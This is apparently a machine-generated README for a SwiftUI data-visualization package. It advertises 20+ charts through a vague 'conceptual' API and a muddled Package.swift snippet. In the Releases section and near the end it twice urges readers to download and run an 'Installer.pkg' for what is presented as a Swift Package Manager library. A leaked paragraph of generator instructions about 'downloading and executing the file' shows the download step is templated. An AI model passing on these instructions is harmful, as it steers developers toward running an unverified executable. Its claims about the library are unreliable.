https://github.com/datpham1012/SwiftUI-Data-Visualization/releases

# SwiftUI Data Visualization: 20+ Charts, Real-time Updates & Accessibility

[![Releases](https://img.shields.io/badge/Releases-View%20on-GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/datpham1012/SwiftUI-Data-Visualization/releases)
[![SwiftPM](https://img.shields.io/badge/SwiftPM-Ready-brightgreen?style=for-the-badge&logo=swift&logoColor=white)](https://swift.org)
[![iOS](https://img.shields.io/badge/iOS-14%2B-blue?style=for-the-badge&logo=apple&logoColor=white)](https://developer.apple.com/ios)
[![macOS](https://img.shields.io/badge/macOS-11%2B-blue?style=for-the-badge&logo=apple&logoColor=white)](https://developer.apple.com/macos)
[![License](https://img.shields.io/badge/License-MIT-brightgreen?style=for-the-badge)](LICENSE)

Table of Contents
- Overview
- Why this library
- Quick start
- Installation with Swift Package Manager
- Architecture and design
- Core concepts and API basics
- Chart types (overview)
- Styling and theming
- Interaction and accessibility
- Data models and real-time updates
- Performance and optimization
- Testing and QA
- Documentation and learning resources
- Demos and gallery
- Roadmap
- Contributing
- Security and privacy
- License

Overview
This project is a data visualization framework built with SwiftUI. It focuses on delivering a polished set of charts that work across iOS and macOS, with real-time data support, interactive features, and full accessibility. It aims to be a robust foundation for dashboards, analytics apps, and data-centric experiences. The library is modular, so you can pick the chart types you need and mix them into dashboards, reports, or embedded visualizations.

Why this library
- 20+ chart types and counting. From classic bar charts to advanced heatmaps, you get a broad palette to present data clearly.
- Real-time updates. Handle streaming data with smooth transitions and live tooltips.
- Rich interactivity. Pan, zoom, touch gestures, tap-to-annotate, and hover tooltips enhance exploration.
- Accessibility first. VoiceOver, Dynamic Type, high-contrast themes, and semantic chart semantics for assistive tech.
- SwiftUI-native. Built with SwiftUI primitives for a natural, declarative integration into modern apps.
- Performance focus. Efficient rendering, data batching, and minimal redraws keep frames fluid.
- Open for customization. Extend chart types, tweak styles, and plug in your own data adapters without fighting the framework.

Quick start
This library is designed for swift adoption. If you are starting from scratch, you can be up and running in a few minutes. You will wire your data model to the charts, pick a type, and start visualizing.

What you will achieve in minutes
- A clean, modern dashboard with interactive charts.
- Real-time updates that reflect incoming data without jank.
- Accessible charts that work for users who rely on screen readers.
- A consistent design language that aligns with SwiftUI best practices.

Getting started is simple:
- Add the library to your project via Swift Package Manager.
- Create a data model that represents your data points.
- Bind your data to a chart view and configure the chart type.
- Enable accessibility features and interactive elements as needed.

Quick usage example (conceptual)
The API described in this guide is designed to be straightforward and expressive. The exact names may vary slightly depending on the version you use, but the patterns remain clear.

- Define a data point
  struct Point {
      let label: String
      let value: Double
      let category: String
  }

- Create a data source
  let data: [Point] = [
      Point(label: "Jan", value: 10, category: "Q1"),
      Point(label: "Feb", value: 14, category: "Q1"),
      Point(label: "Mar", value: 8, category: "Q1"),
      // more points
  ]

- Render a chart
  struct ContentView: View {
      var body: some View {
          DataChart(
              data: data,
              type: .bar // or .line, .area, .pie, .scatter, etc.
          )
          .chartTitle("Monthly Revenue")
          .legendPosition(.bottom)
      }
  }

- Real-time data
  // Connect to a live data stream
  .onReceive(liveDataPublisher) { newPoint in
      // Append or update data, with a smooth transition
      data.append(newPoint)
  }

- Accessibility
  .accessibleLabel("Monthly Revenue Bar Chart")
  .accessibilityHint("Shows revenue per month; swipe to explore values")

Architecture and design
The framework is designed with clear boundaries and explicit data flows. It uses a small set of core abstractions that can be combined to form many chart configurations.

Core ideas
- Declarative views. Charts are SwiftUI views that react to data changes.
- Data-driven rendering. Data models drive visuals, not the view code.
- Separation of concerns. Rendering, layout, interaction, and accessibility are modular.
- Extensible types. New chart types can slot into the same rendering pipeline with minimal boilerplate.

Key components
- ChartView: The reusable wrapper that hosts a chart. It handles layout, scaling, axes, and axes labels.
- ChartRenderer: The rendering engine that maps data points to visuals. It optimizes redraws and supports animation.
- ChartModel: A lightweight representation of data and chart configuration. It decouples data from the view layer.
- InteractionLayer: A layer that handles user input, tooltips, highlighting, and gesture recognition.
- AccessibilityLayer: Encapsulates all accessibility features, including spoken descriptions and semantic labels for each visual element.
- ThemeEngine: Centralizes colors, typography, and general styling to ensure visual consistency.
- DataSourceAdapter: Bridges raw data into the chart’s required data format, with support for streaming or batched data.

Core concepts and API basics
- Chart types are expressed as a mode on a single chart component. You select the type and the library handles the rest.
- The data model is simple: a collection of points with numeric values and optional categories or labels.
- Styles are theme-based. You can switch themes and colors across charts without touching each chart’s internals.
- Animations are smooth by default but configurable. You can enable or disable transitions per chart.
- Accessibility is built in. Each chart exposes a semantic description, and each data point can be independently announced for screen readers.

Chart types (overview)
The library ships with many chart types. Here is a broad overview to help plan dashboards and analytics screens.

- Bar charts: vertical and horizontal variants for category-based comparisons.
- Line charts: smooth or stepped lines, with optional area fills.
- Area charts: stacked, overlapping, or single-series visuals.
- Scatter plots: distribution and correlation views with jitter control.
- Pie and donut charts: proportional shares with interactive slice highlighting.
- Radar charts: multi-axis comparisons across categories.
- Heatmaps: color-coded intensity across a grid for quick scanning.
- TreeMap and Sunburst: hierarchical data arrangements for nested categories.
- Candlestick and OHLC: financial charts for open-high-low-close data.
- Gauge and radial charts: progress indicators and KPI visuals.
- Bubble and choropleth maps: data-anchored visuals across geographies or size-mimicking metrics.
- Waterfall and funnel charts: step-by-step value decomposition and funnel metrics.
- Treemap variants: compact displays for dense category data.
- Choropleth-like visuals: map-based coloring for regional data.
- Specialty charts: stem plots, violin-like density representations, and other niche visuals.

Note: The exact chart types may evolve as the project grows. The design favors consistency. Each type adheres to the same data model and rendering pipeline, ensuring predictable behavior when combining charts in a single screen.

Styling and theming
- Theme-based colors: light, dark, high-contrast, and brand-friendly palettes.
- Typography: scalable fonts compatible with Dynamic Type.
- Per-chart customization: margins, padding, axis styling, label formats, and grid visibility can be tuned per chart.
- Accent management: highlights, hover states, and selected slices have configurable colors and glow effects.

Interaction and accessibility
Interactive and accessible visuals are core to the library. The API supports intuitive exploration and inclusive usage.

Interactions
- Touch and pointer gestures: tap for details, long-press for a quick peek, pan to scrub, pinch to zoom (where appropriate).
- Tooltips and annotations: contextual data shown on hover or tap, with optional snapping to nearest data point.
- Keyboard navigation: arrow keys move focus across data points where applicable.
- Quick filters: built-in support for category filters, which can be wired to UI controls outside the chart.

Accessibility
- Semantic labeling: each data point exposes descriptive text suitable for screen readers.
- Dynamic type: font scales adapt to user preferences without breaking layout.
- High-contrast support: contrast levels adjusted automatically for legibility.
- Focus management: keyboard focus is predictable and consistent as you navigate charts.
- Accessible descriptions: charts describe the overall purpose, data range, and notable features when announced.

Data models and real-time updates
The library is designed to handle both static snapshots and streaming data.

Data model
- ChartPoint: a minimal representation of a data item. It includes:
  - label: a string for the axis or category label
  - value: a numeric measure
  - category: an optional grouping label
  - timestamp: optional, for time-series data
- DataSource: a protocol or adapter that provides data points to charts. It supports:
  - static data arrays
  - streaming data via Combine publishers or async sequences
  - batching and buffering to optimize redraws

Real-time updates
- The charts smoothly interpolate between data changes.
- You can enable autonomous streaming with a publish-subscribe pattern.
- Data changes trigger animated transitions. Old points fade out or slide, new points slide in.
- Tooltips update in real time to reflect the latest data snapshot.

Performance and optimization
- Rendering: the renderer uses efficient path updates and minimizes redraws unless data changes.
- Data management: batching and throttling help when data streams arrive rapidly.
- Memory: charts only keep necessary metadata about visible points to reduce memory pressure.
- Layout: charts calculate their own intrinsic sizes to fit in various device sizes without layout thrashing.

Testing and QA
- Unit tests cover data binding, chart type switching, and theming.
- UI tests validate accessibility labels, color contrast, and correct rendering under different dynamic type settings.
- Snapshot tests guard visual consistency across themes and screen sizes.
- Performance tests measure frame rates during data bursts and interaction scenarios.

Documentation and learning resources
- Full API docs with method signatures, enums, and configuration options.
- Quick start guides for common use cases.
- Tutorials that walk through building a dashboard, adding interactivity, and enabling accessibility features.
- Sample projects demonstrating real-world usage patterns.

Demos and gallery
- A gallery of chart examples showing layout options, different data shapes, and theme combinations.
- Each example includes a short description and a link to its source file in the examples folder.
- Live previews can be explored in the demo app included in the repository or linked from the Releases page.

Usage patterns and best practices
- Start with a single chart to establish data binding and theming before adding more charts to a screen.
- Prefer a consistent chart type for related metrics to reduce cognitive load.
- Use tooltips sparingly and provide a clear legend to keep the interface clean.
- Make accessibility a default. Always provide semantic labels and describe the chart’s purpose.
- When handling large data sets, consider data sampling or aggregation to keep rendering fast.

Installation and setup
Swift Package Manager is the recommended way to add this library to your project. The package is designed to be easy to integrate and to work with current Xcode projects.

Installation steps
1) In Xcode, choose File > Swift Packages > Add Package Dependency.
2) Enter the repository URL:
   https://github.com/datpham1012/SwiftUI-Data-Visualization.git
3) Choose the version rule that matches your project. For example, from the latest major version, or a specific tag.
4) Add the package to the target(s) that will consume the charts.
5) Import the library in your Swift files:
   import SwiftUIDataVisualization

6) Start building charts by composing DataChart views and binding your data.

Notes
- The library is designed to be compatible with iOS 14+ and macOS 11+. If you target a different platform, verify minimum requirements in the release notes.
- If your app uses a custom theme, you can inject theme settings through the ThemeEngine or via modifiers on the chart view.

Architectural decisions
- SwiftUI-first approach: charts render as SwiftUI views and adhere to the SwiftUI life cycle.
- Lightweight rendering layer: rendering is decoupled from data, enabling fast redraws even with large data sets.
- Extensibility: chart types are additive. You can introduce new visuals by extending a minimal protocol while reusing core rendering and layout logic.
- Accessibility by default: charts expose descriptive semantics to the accessibility framework without extra wiring.

Examples and gallery
- The examples folder contains sample projects demonstrating common patterns:
  - Basic bar chart with static data
  - Real-time line chart with streaming values
  - Interactive heatmap with pan and zoom
  - Accessible dashboard demonstrating VoiceOver labels
- Each example includes a README with explanations, design notes, and testing tips.

Contributing and community
- This project welcomes contributions. If you plan to contribute, follow the contributor guidelines in the CONTRIBUTING.md file.
- You can report issues, request features, or propose improvements on the issues page.
- The community values clarity, simplicity, and accessibility. Please keep discussions constructive and focused on the code and design.

Releases and downloads
- Access the official releases to obtain prebuilt assets, sample apps, and installers. The latest release page is the destination for download and testing.
- From the Releases page, download the latest asset named something like SwiftUI-Data-Visualization-Installer.pkg and run it to install the library into your project environment. This file is designed for quick setup and minimal friction.
- The public release assets are intended for developers who want to experiment with the library quickly and without building from source.
- If the link does not open in your browser or shows an error, navigate to the Releases section of the repository and download the asset there.

Downloads reference
- Official releases page: https://github.com/datpham1012/SwiftUI-Data-Visualization/releases
- Re-run the link to revisit the assets and verify checksums, platform compatibility, and installer instructions.
- The download asset names, sizes, and platforms may vary between releases. Always read the release notes to confirm the exact steps required for installation.

SDK compatibility and platform notes
- iOS and macOS targets share a common data visualization core, with platform-specific renderers for charts and interactions.
- On iOS, charts adapt to compact layouts, notch-safe areas, and dynamic type.
- On macOS, charts can take advantage of larger canvases and precise pointer interactions.
- SwiftUI features used by the library are compatible with modern Xcode versions. If you maintain an older toolchain, consider using a compatible release or building from source.

Testing, quality, and accessibility checks
- Unit tests focus on data binding correctness and chart configuration handling.
- UI tests validate user interactions, such as tapping a data point and reading its value aloud by VoiceOver.
- Accessibility checks ensure semantic labels and descriptions are present for each data element and that color contrast meets accessibility standards.
- Performance tests simulate data bursts to verify that frame rates stay smooth.

Documentation structure
- The repo ships with a generated API reference. If you want deeper dives, consult the docs folder and the online docs site if provided.
- Each chart type includes a usage section, configuration patterns, and examples.
- Theming and styling docs explain how to theme entire dashboards and apply brand colors consistently.

Changelog and versioning
- The repository uses semantic versioning. Each release may include migration notes, breaking changes, and upgrade guidance.
- When upgrading, review the release notes to understand changes to APIs, defaults, and any deprecations.

Roadmap
- Chart type expansions: add more niche visualizations and multi-axis charts.
- Enhanced interaction: richer gesture support, cross-chart brushing, and synchronized tooltips.
- Accessibility enhancements: deeper screen reader narratives and richer semantic descriptions.
- Performance improvements: smarter data aggregation, efficient path rendering, and lower memory overhead.
- Documentation improvements: more tutorials, code samples, and best-practice guides.

Security and privacy
- The library itself does not collect user data. Any data you pass into charts remains in your app's memory.
- If you enable online data streams, ensure data handling complies with your app's privacy policy.
- The codebase encourages safe defaults, including access control for any external data sources used in demos.

License
- This project is released under the MIT license. See the LICENSE file for full terms.

Appendix: quick reference API outline (conceptual)
- DataChart(data:, type: ChartType) -> ChartView
- ChartType: enum with cases like bar, line, area, pie, donut, heatmap, radar, scatter, bubble, candlestick, OHLC, treemap, sunburst, gauge, funnel, waterfall
- ChartView modifiers:
  - chartTitle(_:)
  - legendPosition(_:)
  - showGrid(Bool)
  - animation(enabled: Bool, duration: Double)
  - theme(_:)
  - accessibilityLabel(_:)
  - accessibilityHint(_:)
- Data binding helpers:
  - DataSourceAdapter
  - Binding to a @Published or @ObservedObject data array
  - Support for Combine publishers or async sequences
- Real-time:
  - onReceive(_:) or onNewData(_:) closures to append or replace data
  - options for streaming mode, buffering, and throttling

Gallery of example configurations (descriptive)
- Simple bar chart with categories
  - Clean axis labels, evenly spaced bars, subtle grid
  - Tooltip shows the category and value
- Time-series line chart with live data
  - Smooth transitions, time axis formatting, zoom and pan
  - Annotations for notable events
- Interactive heatmap
  - Color scale conveys intensity, cells respond to taps
  - Legend shows color-to-value mapping
- Candlestick chart for stock data
  - Open/High/Low/Close with color-coded trends
  - Tooltips display detailed data for the selected period

Design notes and recommendations
- Start with a single, simple chart to validate data binding and theming before adding more complex layouts.
- Use a consistent color palette across charts to reduce cognitive load.
- When presenting time-based data, prefer line or area charts for trends and bar charts for discrete comparisons.
- For dense dashboards, keep the number of visible data points reasonable to preserve legibility.
- Always test accessibility early. A chart that is not labeled or described is not usable by all users.

Suggested project structure (for contributors)
- Sources
  - Sources for core rendering and layout
- Charts
  - Individual chart types with common rendering utilities
- Data
  - Data models, adapters, and streaming helpers
- UI
  - Shared components like legends, axis labels, and tooltips
- Accessibility
  - Accessible descriptions, semantic labeling helpers, and voiceover tests
- Tests
  - Unit tests, UI tests, and performance tests
- Examples
  - Mini projects showing real-world usage
- Docs
  - API docs, guides, and tutorials

Usage tips and deployment notes
- When integrating into an app, wrap chart views in containers that handle theming and responsiveness.
- Consider using a shared data layer to feed multiple charts with a single source of truth.
- For large dashboards, implement data virtualization or paging to limit on-screen data.
- If you need offline support, ensure the data is cached and that the charts can render from cached data without network access.

Release notes etiquette
- Always read release notes before upgrading. Migration notes help you adjust to API changes, new defaults, or deprecations.
- If you rely on a specific chart type, verify that its API surface remains stable with the new release.

End note
- For the latest releases and assets, visit the official releases page again:
  https://github.com/datpham1012/SwiftUI-Data-Visualization/releases

Downloads reference (second appearance)
- Official releases page: https://github.com/datpham1012/SwiftUI-Data-Visualization/releases
- From that page, download the latest asset (for example, SwiftUI-Data-Visualization-Installer.pkg) and run the installer to set up the library in your workspace.

Notes on the link guidance
- If the link has a path part, the documentation above references the asset you would download from that page. It’s the latest release asset named on that page.
- If the link were only a domain, the guidance would be to visit it. Here, the path is present, so the instruction about downloading and executing the file applies.
- If the link stopped working, check the Releases section for an alternative download. The Releases page is the source of truth for installers and sample assets.
- You can use a colorful button for the link with the badges shown above, which link to the same Releases page.

Repository topics
- accessibility, analytics, animations, chart-library, charts, dashboards, data-visualization, interactive-graphs, ios, ios-development, mobile-development, performance, real-time-data, spm, swift, swift-package-manager, swiftui, testing, ui-ux, xcode

Illustrative imagery and assets
- [Gallery image of charts](https://images.unsplash.com/photo-1555066931-4365d14bab8c?auto=format&fit=crop&w=1200&q=60)
- [Dashboard scene](https://images.unsplash.com/photo-1496307042754-b4aa456c4a2d?auto=format&fit=crop&w=1200&q=60)
- [Interactive data visualization concept](https://images.unsplash.com/photo-1527286314480-8f3a1fefd2c0?auto=format&fit=crop&w=1200&q=60)

Appendix: example package manifest snippet (for reference)
- This is a conceptual snippet to illustrate how you might declare the library in your app’s Package.swift when integrating via Swift Package Manager.

# Example Package.swift excerpt (conceptual)
//
// swift-tools-version:5.7
import PackageDescription

let package = Package(
    name: "YourApp",
    platforms: [
        .iOS(.v14),
        .macOS(.v11)
    ],
    products: [
        .library(name: "SwiftUIDataVisualization", targets: ["SwiftUIDataVisualization"])
    ],
    dependencies: [
        // Other dependencies
        .package(url: "https://github.com/datpham1012/SwiftUI-Data-Visualization.git", from: "1.0.0"),
    ],
    targets: [
        .target(name: "SwiftUIDataVisualization", dependencies: []),
        .testTarget(name: "SwiftUIDataVisualizationTests", dependencies: ["SwiftUIDataVisualization"]),
    ]
)

Repository topics (again)
- accessibility, analytics, animations, chart-library, charts, dashboards, data-visualization, interactive-graphs, ios, ios-development, mobile-development, performance, real-time-data, spm, swift, swift-package-manager, swiftui, testing, ui-ux, xcode

Releases and provenance
- The Releases page is the canonical source of installer packages, sample projects, and asset bundles. If you need a clean setup experience, start there.
- If you ever run into a broken link or missing asset, go to the Releases section to find alternate assets or the source code, and check the accompanying notes for instructions.

Note: This README is designed to be a thorough and practical guide. It emphasizes practical steps, real-world usage, and clear guidance for developers building dashboards and analytics apps with SwiftUI. It follows a calm, confident tone and uses plain language to facilitate quick adoption and long-term maintainability.